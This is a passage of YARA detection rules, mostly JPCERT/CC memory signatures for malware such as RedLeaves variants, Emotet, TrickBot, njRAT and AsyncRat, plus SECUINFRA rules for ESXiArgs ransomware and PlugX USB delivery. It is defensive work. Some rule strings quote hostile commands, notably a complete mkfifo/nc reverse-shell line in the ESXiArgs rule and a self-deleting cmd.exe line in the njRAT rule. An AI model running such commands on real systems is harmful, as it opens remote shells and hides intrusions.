
	strings:
		$v1 = "red_autumnal_leaves_dllmain.dll"
		$b1 = { FF FF 90 00 }

	condition:
		$v1 and $b1 at 0
}

rule JPCERTCC_Himawari
{
	meta:
		description = "detect Himawari(a variant of RedLeaves) in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "85c33dc6-0f9b-5645-b236-f416df16b4a4"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://www.jpcert.or.jp/present/2018/JSAC2018_01_nakatsuru.pdf"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L68-L82"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "9014e6e02fb9d8fa0f646c61647ab28c3cb08f10f8f584ddd11eba27211307f5"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "3938436ab73dcd10c495354546265d5498013a6d17d9c4f842507be26ea8fafb"

	strings:
		$h1 = "himawariA"
		$h2 = "himawariB"
		$h3 = "HimawariDemo"

	condition:
		all of them
}

rule JPCERTCC_Lavender
{
	meta:
		description = "detect Lavender(a variant of RedLeaves) in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "8c30ae73-161f-5117-a1f9-fad0bd5278de"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L84-L97"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "bf64f927e2c8e9be0f11497f94357de8e3fadcf09ba224d6fec92841c89c1dc5"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "db7c1534dede15be08e651784d3a5d2ae41963d192b0f8776701b4b72240c38d"

	strings:
		$a1 = { C7 ?? ?? 4C 41 56 45 }
		$a2 = { C7 ?? ?? 4E 44 45 52 }

	condition:
		all of them
}

rule JPCERTCC_Armadill
{
	meta:
		description = "detect Armadill(a variant of RedLeaves) in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "0e6fb091-5c26-5419-ac99-5ddc9db29fc0"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L99-L111"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "a76d434469a45e1c48b8ec3dc9622017c78ea52824006ddfcf3c368fbda7c912"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$a1 = { C7 ?? ?? 41 72 6D 61 }
		$a2 = { C7 ?? ?? 64 69 6C 6C }

	condition:
		all of them
}

rule JPCERTCC_Zark20Rk
{
	meta:
		description = "detect zark20rk(a variant of RedLeaves) in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "baf3ebfe-80dd-5601-9ba9-8866b6ab6f14"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L113-L126"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "07c5c97916bd9ec19591d90f8b7d872fca571f3479148157cf1ee9e05c272e5c"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "d95ad7bbc15fdd112594584d92f0bff2c348f48c748c07930a2c4cc6502cd4b0"

	strings:
		$a1 = { C7 ?? ?? 7A 61 72 6B }
		$a2 = { C7 ?? ?? 32 30 72 6B }

	condition:
		all of them
}

rule JPCERTCC_Ursnif_1
{
	meta:
		description = "detect Ursnif(a.k.a. Dreambot, Gozi, ISFB) in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "e93bc13b-33a9-5d9a-92a9-52f16a97fb16"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L128-L158"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "6c224b43e8ec0fa9540a1fdedce7ce4b97f8ab7196a9619594b7dcb9c2dc5169"
		score = 60
		quality = 60
		tags = ""
		rule_usage = "memory scan"
		hash1 = "0207c06879fb4a2ddaffecc3a6713f2605cbdd90fc238da9845e88ff6aef3f85"
		hash2 = "ff2aa9bd3b9b3525bae0832d1e2b7c6dfb988dc7add310088609872ad9a7e714"
		hash3 = "1eca399763808be89d2e58e1b5e242324d60e16c0f3b5012b0070499ab482510"

	strings:
		$a1 = "soft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x"
		$b1 = "client.dll" fullword
		$c1 = "version=%u"
		$c2 = "user=%08x%08x%08x%08x"
		$c3 = "server=%u"
		$c4 = "id=%u"
		$c5 = "crc=%u"
		$c6 = "guid=%08x%08x%08x%08x"
		$c7 = "name=%s"
		$c8 = "soft=%u"
		$d1 = "%s://%s%s"
		$d2 = "PRI \x2A HTTP/2.0"
		$e1 = { A1 ?? ?? ?? 00 35 E7 F7 8A 40 50 }
		$e2 = { 56 56 56 6A 06 5? FF ?? ?? ?? ?? 00 }
		$f1 = { 56 57 BE ?? ?? ?? ?? 8D ?? ?? A5 A5 A5 }
		$f2 = { 35 8F E3 B7 3F }
		$f3 = { 35 0A 60 2E 51 }

	condition:
		$a1 or ( $b1 and 3 of ( $c* ) ) or ( 5 of ( $c* ) ) or ( $b1 and all of ( $d* ) ) or all of ( $e* ) or all of ( $f* )
}

rule JPCERTCC_Emotet_1
{
	meta:
		description = "detect Emotet in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "f1cb5e3e-069d-54bb-829d-2ff4aa80e2bb"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L160-L176"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "32f6c25f324eb9f79b8f0b4bc37d648ed95d6347712208f13f74584ee164dc4f"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v4a = { BB 00 C3 4C 84 }
		$v4b = { B8 00 C3 CC 84 }
		$v5a = { 6D 4E C6 41 33 D2 81 C1 39 30 00 00 }
		$v6a = { C7 40 20 ?? ?? ?? 00 C7 40 10 ?? ?? ?? 00 C7 40 0C 00 00 00 00 83 3C CD ?? ?? ?? ?? 00 74 0E 41 89 48 ?? 83 3C CD ?? ?? ?? ?? 00 75 F2 }
		$v7a = { 6A 06 33 D2 ?? F7 ?? 8B DA 43 74 }
		$v7b = { 83 E6 0F 8B CF 83 C6 04 50 8B D6 E8 ?? ?? ?? ?? 59 6A 2F 8D 3C 77 58 66 89 07 83 C7 02 4B 75 }

	condition:
		all of ( $v4* ) or $v5a or $v6a or all of ( $v7* )
}

rule JPCERTCC_Smokeloader_1
{
	meta:
		description = "detect SmokeLoader in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "19666821-1fe9-50e7-958e-22f2260099aa"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://www.cert.pl/en/news/single/dissecting-smoke-loader/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L178-L191"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "11b7a297d3dcacba57de9b04a6d126970c2be9d5551f7976ac8129b0afbc9bfd"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$a1 = { B8 25 30 38 58 }
		$b1 = { 81 3D ?? ?? ?? ?? 25 00 41 00 }
		$c1 = { C7 ?? ?? ?? 25 73 25 73 }

	condition:
		$a1 and $b1 and $c1
}

rule JPCERTCC_Hawkeye
{
	meta:
		description = "detect HawkEye in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "fc988aaf-bdac-5a53-a90c-d35d86285cd6"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L259-L272"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "45256e1e56de3934d2e57a7c036d49a0f56c25538ed7ad3eb7ee8efa7f549e98"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$hawkstr1 = "HawkEye Keylogger" wide
		$hawkstr2 = "Dear HawkEye Customers!" wide
		$hawkstr3 = "HawkEye Logger Details:" wide

	condition:
		all of them
}

rule JPCERTCC_Lokibot
{
	meta:
		description = "detect Lokibot in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "12e8469b-83e9-5f93-a543-1c2efb4d303a"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L274-L288"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "3d2db6acb565d705ba26acb7f75be24096ab619a03726f4898391bfe5944bc46"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "6f12da360ee637a8eb075fb314e002e3833b52b155ad550811ee698b49f37e8c"

	strings:
		$des3 = { 68 03 66 00 00 }
		$param = "MAC=%02X%02X%02XINSTALL=%08X%08X"
		$string = { 2d 00 75 00 00 00 46 75 63 6b 61 76 2e 72 75 00 00}

	condition:
		all of them
}

rule JPCERTCC_Bebloh
{
	meta:
		description = "detect Bebloh(a.k.a. URLZone) in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "7c3decb2-9cb5-5569-bab2-982c769ee233"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L290-L304"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "22b8ae9d40d34f83d8cc6c2dab56a866c8de8c9cc38b5da962c7071302f91f03"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$crc32f = { b8 EE 56 0b ca }
		$dga = "qwertyuiopasdfghjklzxcvbnm123945678"
		$post1 = "&vcmd="
		$post2 = "?tver="

	condition:
		all of them
}

rule JPCERTCC_Xxmm
{
	meta:
		description = "detect xxmm in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "be459cbf-84a1-539e-b0b5-b7a00b6d278d"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L306-L319"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "4a860ac3efb97ce03fa906c2d0e7cd08654f6e82531d9449af7891be83a036d5"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "setupParameter:"
		$v2 = "loaderParameter:"
		$v3 = "parameter:"

	condition:
		all of them
}

rule JPCERTCC_Azorult_1
{
	meta:
		description = "detect Azorult in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "c73a007c-4d5f-5504-9635-9bffe1282aef"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L321-L334"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "158d65dcd8f3ce8fe4ab2d9bcc97edf585c1d665cc54e1e4969ef83c8103a149"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)"
		$v2 = "http://ip-api.com/json"
		$v3 = { c6 07 1e c6 47 01 15 c6 47 02 34 }

	condition:
		all of them
}

rule JPCERTCC_Poisonivy
{
	meta:
		description = "detect PoisonIvy in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "e7b27a88-490f-5f79-9e8c-65b8f7505a72"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L336-L349"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "dec7a95c877078f77cbcdcf8646680f6f1d55d438af98e519d13461a7854b095"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$a1 = { 0E 89 02 44 }
		$b1 = { AD D1 34 41 }
		$c1 = { 66 35 20 83 66 81 F3 B8 ED }

	condition:
		all of them
}

rule JPCERTCC_Netwire
{
	meta:
		description = "detect netwire in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "cf71b80f-2618-5209-bb49-fefea9e0a7f3"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L351-L367"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "fa6ec967b6b3de226dcdb06d6b8f684800331a2420f038dd6274a8b9c3d8be78"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "HostId-%Rand%"
		$v2 = "mozsqlite3"
		$v3 = "[Scroll Lock]"
		$v4 = "GetRawInputData"
		$ping = "ping 192.0.2.2"
		$log = "[Log Started] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]"

	condition:
		($v1 ) or ( $v2 and $v3 and $v4 ) or ( $ping and $log )
}

rule JPCERTCC_Nanocore
{
	meta:
		description = "detect Nanocore in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "0b12ad94-99c2-5d48-a860-ff75b82971af"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L369-L382"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "471dcda6f5fb9c30e3a1df7171fdba889114d54166d038d18c7910e2765d5250"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "NanoCore Client"
		$v2 = "PluginCommand"
		$v3 = "CommandType"

	condition:
		all of them
}

rule JPCERTCC_Formbook_1
{
	meta:
		description = "detect Formbook in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "71291f9b-eb8e-55e5-a499-df54c35efdbf"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L384-L397"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "62bd3717af8970f67f28d923ce2483ff55a5ef4585a183d4d510e3a2c45fcc8c"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$sqlite3step = { 68 34 1c 7b e1 }
		$sqlite3text = { 68 38 2a 90 c5 }
		$sqlite3blob = { 68 53 d8 7f 8c }

	condition:
		all of them
}

rule JPCERTCC_Agenttesla_Type1
{
	meta:
		description = "detect Agenttesla in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "92bfb3ab-d8d0-50ec-8ab8-ad34f1edb906"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L399-L411"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "24b9b815400967a9086048527f7aa1fce08bcd94a16aec8080aeac97045b297a"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$iestr = "C:\\\\Users\\\\Admin\\\\Desktop\\\\IELibrary\\\\IELibrary\\\\obj\\\\Debug\\\\IELibrary.pdb"
		$atstr = "C:\\\\Users\\\\Admin\\\\Desktop\\\\ConsoleApp1\\\\ConsoleApp1\\\\obj\\\\Debug\\\\ConsoleApp1.pdb"
		$sqlitestr = "Not a valid SQLite 3 Database File" wide

	condition:
		all of them
}

rule JPCERTCC_Noderat
{
	meta:
		description = "detect Noderat in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "9c2c4b0f-0f45-54f6-a98c-b592af882eef"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://blogs.jpcert.or.jp/ja/2019/02/tick-activity.html"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L429-L442"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "e1254b6cf28161943db202ea0a6ff2d86aa7975d4a3ecc0f26eed58101e54960"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$config = "/config/app.json"
		$key = "/config/.regeditKey.rc"
		$message = "uninstall error when readFileSync: "

	condition:
		all of them
}

rule JPCERTCC_Njrat
{
	meta:
		description = "detect njRAT in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "96b35796-3e1d-5721-998a-e678612e4de7"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://github.com/JPCERTCC/MalConfScan/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L444-L456"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "398614ff5ea37dfaf6c36f60702cb7cdfe66b4569c698e9c3ea29563e4031856"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "d5f63213ce11798879520b0e9b0d1b68d55f7727758ec8c120e370699a41379d"

	strings:
		$reg = "SEE_MASK_NOZONECHECKS" wide fullword
		$msg = "Execute ERROR" wide fullword
		$ping = "cmd.exe /c ping 0 -n 2 & del" wide fullword

	condition:
		all of them
}

rule JPCERTCC_Trickbot
{
	meta:
		description = "detect TrickBot in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "1a3c5193-bea1-5f64-be40-47bd22c09772"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://github.com/JPCERTCC/MalConfScan/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L458-L478"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "b0c3437bc4b4f9e7b2a1562e2d514b7aad398d5e387bb79829757b5772a1ebc3"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "2153be5c6f73f4816d90809febf4122a7b065cbfddaa4e2bf5935277341af34c"

	strings:
		$tagm1 = "<mcconf><ver>" wide
		$tagm2 = "</autorun></mcconf>" wide
		$tagc1 = "<moduleconfig><autostart>" wide
		$tagc2 = "</autoconf></moduleconfig>" wide
		$tagi1 = "<igroup><dinj>" wide
		$tagi2 = "</dinj></igroup>" wide
		$tags1 = "<servconf><expir>" wide
		$tags2 = "</plugins></servconf>" wide
		$tagl1 = "<slist><sinj>" wide
		$tagl2 = "</sinj></slist>" wide
		$dllname = { 6C 00 00 00 CC 00 00 00 19 01 00 00 00 00 00 00 1A 01 }

	condition:
		all of ( $tagm* ) or all of ( $tagc* ) or all of ( $tagi* ) or all of ( $tags* ) or all of ( $tagl* ) or $dllname
}

rule JPCERTCC_Remcos_1
{
	meta:
		description = "detect Remcos in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "4a27a16a-2669-5009-bc82-082ec0c9b2c1"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://github.com/JPCERTCC/MalConfScan/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L480-L493"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "1b4b9f7a88f33faeda71ea9a354eeccba8889800f48a6280c4ec533bb1b3ef3d"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "7d5efb7e8b8947e5fe1fa12843a2faa0ebdfd7137582e5925a0b9c6a9350b0a5"

	strings:
		$remcos = "Remcos" ascii fullword
		$url1 = "Breaking-Security.Net" ascii fullword
		$url2 = "BreakingSecurity.Net" ascii fullword
		$resource = "SETTINGS" ascii wide fullword

	condition:
		1 of ( $url* ) and $remcos and $resource
}

rule JPCERTCC_Quasar
{
	meta:
		description = "detect QuasarRAT in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "f0a81a46-c19b-5012-a1a2-f2f4310fcde3"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://github.com/JPCERTCC/MalConfScan/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L495-L513"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "a3bb45f2ea217ae1825d80e1ead9c3e47ca88575c960ce1f9feb2db09f489e08"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "390c1530ff62d8f4eddff0ac13bc264cbf4183e7e3d6accf8f721ffc5250e724"

	strings:
		$quasarstr1 = "Client.exe" wide
		$quasarstr2 = "({0}:{1}:{2})" wide
		$sql1 = "SELECT * FROM Win32_DisplayConfiguration" wide
		$sql2 = "{0}d : {1}h : {2}m : {3}s" wide
		$sql3 = "SELECT * FROM FirewallProduct" wide
		$net1 = "echo DONT CLOSE THIS WINDOW!" wide
		$net2 = "freegeoip.net/xml/" wide
		$net3 = "http://api.ipify.org/" wide
		$resource = { 52 00 65 00 73 00 6F 00 75 00 72 00 63 00 65 00 73 00 00 17 69 00 6E 00 66 00 6F 00 72 00 6D 00 61 00 74 00 69 00 6F 00 6E 00 00 }

	condition:
		(( all of ( $quasarstr* ) or all of ( $sql* ) ) and $resource ) or all of ( $net* )
}

rule JPCERTCC_Elf_Plead
{
	meta:
		description = "ELF_PLEAD"
		author = "JPCERT/CC Incident Response Group"
		id = "12f93939-812f-52b6-9582-b375bb361892"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://github.com/JPCERTCC/MalConfScan/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L515-L529"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		hash = "f704303f3acc2fd090145d5ee893914734d507bd1e6161f82fb34d45ab4a164b"
		logic_hash = "088d17afe77076f8b1e5f7cb285d825d597d9c971a03f878bf64b6d2af14a01f"
		score = 75
		quality = 80
		tags = ""

	strings:
		$ioctl = "ioctl TIOCSWINSZ error"
		$class1 = "CPortForwardManager"
		$class2 = "CRemoteShell"
		$class3 = "CFileManager"
		$lzo = { 81 ?? FF 07 00 00 81 ?? 1F 20 00 00 }

	condition:
		3 of them
}

rule JPCERTCC_Asyncrat
{
	meta:
		description = "detect AsyncRat in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "758614e8-df93-54ff-9f06-0020b54fbf88"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L531-L548"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "0a60718ea3412129c40e2eee53591dbf094a6b914502242b5ab9b54f8fd95da0"
		score = 75
		quality = 76
		tags = ""
		rule_usage = "memory scan"
		hash1 = "1167207bfa1fed44e120dc2c298bd25b7137563fdc9853e8403027b645e52c19"
		hash2 = "588c77a3907163c3c6de0e59f4805df41001098a428c226f102ed3b74b14b3cc"

	strings:
		$salt = {BF EB 1E 56 FB CD 97 3B B2 19 02 24 30 A5 78 43 00 3D 56 44 D2 1E 62 B9 D4 F1 80 E7 E6 C3 39 41}
		$b1 = {00 00 00 0D 53 00 48 00 41 00 32 00 35 00 36 00 00}
		$b2 = {09 50 00 6F 00 6E 00 67 00 00}
		$s1 = "pastebin" ascii wide nocase
		$s2 = "pong" wide
		$s3 = "Stub.exe" ascii wide

	condition:
		($salt and ( 2 of ( $s* ) or 1 of ( $b* ) ) ) or ( all of ( $b* ) and 2 of ( $s* ) )
}

rule SECUINFRA_RANSOM_Esxiargs_Ransomware_Python_Feb23
{
	meta:
		description = "Detects the ESXiArgs Ransomware encryption bash script"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "6e2d6695-b727-5b71-bfa0-e8290e057c36"
		date = "2023-02-07"
		modified = "2023-02-07"
		reference = "https://secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/RANSOM_ESXiArgs_Ransomware_Python_Feb23.yar#L1-L31"
		license_url = "N/A"
		logic_hash = "b821d1829ab4fb5eea896156a303198d6531d734196f0f947aef5d46754e6ccb"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$python = "#!/bin/python"
		$desc = "This module starts debug tools"
		$command0 = "server_namespace"
		$command1 = "service_instance"
		$command2 = "local"
		$command3 = "operation_id"
		$command4 = "envelope"
		$cmd = "'mkfifo /tmp/tmpy_8th_nb; cat /tmp/tmpy_8th_nb | /bin/sh -i 2>&1 | nc %s %s > /tmp/tmpy_8th_nb' % (host, port)"
		$OpenSLPPort = "port = '427'"
		$listener = "HTTPServer(('127.0.0.1', 8008), PostServer).serve_forever()"

	condition:
		$python and $desc and 4 of ( $command* ) and $cmd and $OpenSLPPort and $listener
}

rule SECUINFRA_MALWARE_Plugx_USB_Delivery_LNK_Jun23
{
	meta:
		description = "Detects PlugX-style Malware delivery via removable Drives (USB) - LNK File"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "14c2e37e-91d7-5b66-916f-a1544a69a6fc"
		date = "2023-06-21"
		modified = "2023-06-21"
		reference = "https://unit42.paloaltonetworks.com/plugx-variants-in-usbs/"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/MALWARE_PlugX_USB_Delivery_Jun21.yar#L1-L31"
		license_url = "N/A"
		logic_hash = "afbbaf44e97b6db584780e0739bffd9c70e05e86284cb25b25a9d02cbeffff1f"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$lnk_magic = {4C 00 00 00 01 14 02 00}
		$driveletter_4X = {4? 00 3A 00 5C 00 A0 00 5C}
		$driveletter_5X = {5? 00 3A 00 5C 00 A0 00 5C}
		$s_cmd = "C:\\Windows\\System32\\cmd.exe" ascii
		$s_recBin = "\\RECYCLER.BIN\\" wide
		$s_shell32 = "%SystemRoot%\\system32\\SHELL32.dll" wide
		$s_comspec = "%ComSpec%" ascii

	condition:
		$lnk_magic at 0x0 and any of ( $s_* ) and ( $driveletter_4X or $driveletter_5X )
}

rule SECUINFRA_MALWARE_Plugx_USB_Delivery_Ini_Icon_Jun23
{
	meta:
		description = "Detects PlugX-style Malware delivery via removable Drives (USB) - Desktop.ini Icon File; could potentially yield FPs"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "faaa507f-8478-5412-be86-4cae7fe28d21"
		date = "2023-06-21"
		modified = "2023-06-21"
		reference = "https://unit42.paloaltonetworks.com/plugx-variants-in-usbs/"
